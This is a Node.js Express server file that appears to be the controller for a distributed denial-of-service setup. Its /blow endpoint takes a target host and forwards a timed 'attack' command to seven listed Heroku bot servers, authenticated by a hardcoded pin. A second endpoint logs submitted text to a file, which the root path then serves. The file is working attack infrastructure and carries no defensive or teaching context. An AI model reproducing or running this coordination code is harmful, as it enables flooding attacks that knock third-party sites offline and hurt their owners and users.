var express = require('express');
var path = require('path');

var Req = require('request');

var fs = require('fs');

var app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(function (req,res,next) {
  if(!req.query.hash || req.query.hash !== "1111991")
  {
    res.status(403);
    res.end('your are banned');
    return;
  }

  next();
});



app.post('/blow',function (req,res ) {
  var host = req.body.host;
  res.end('done');

  sendCmd(['https://bb-s1.herokuapp.com/',
'https://bb-s2.herokuapp.com/',
'https://bb-s3.herokuapp.com/',
'https://bb-s4.herokuapp.com/',
'https://bb-s5.herokuapp.com/',
'https://bb-s6.herokuapp.com/',
'https://bb-s7.herokuapp.com/'
],host);


});

app.post('/reg',function (req,res) {
  res.end('saved');
  var txt = req.body.s;
  save(txt);
});


function save(txt) {
  var date = getNow();
  date = new Date(date).toTimeString();

  fs.appendFile('log.txt', '\n'+date+'  ::'+txt, function (err) {
  if (err) throw err;
  console.log('Updated!');
});


}

app.use('/', function (req,res) {
  res.sendFile(__dirname+'/log.txt');
});

app.use(function (req,res) {
  res.status(404);
  res.end('Not Found');
});

function sendCmd(servers,host) {
var time = getNow() + (1 * 60*1000);
var s = 0;
var e = servers.length;

var onSucess = function (err,rr,body) {
  if (err)
  {
    console.log(err);
    return;
  }
    s++;
    console.log('cmd '+ s +' success');
    console.log(body);
    if (s >= e)
    {

    }
    else send();


}

var send = function () {
  var pin = '1111991';
  var url = servers[s] + 'attack/?hash='+pin;
  console.log(url);
  Req.post({
    url:url,
    form:{
      time:time,
      host:host
    }
  },onSucess);
}

send();




}

function getNow() {
  var iraq = new Date().getTime();
  return iraq;
}

console.log('now :'+getNow());
module.exports = app;
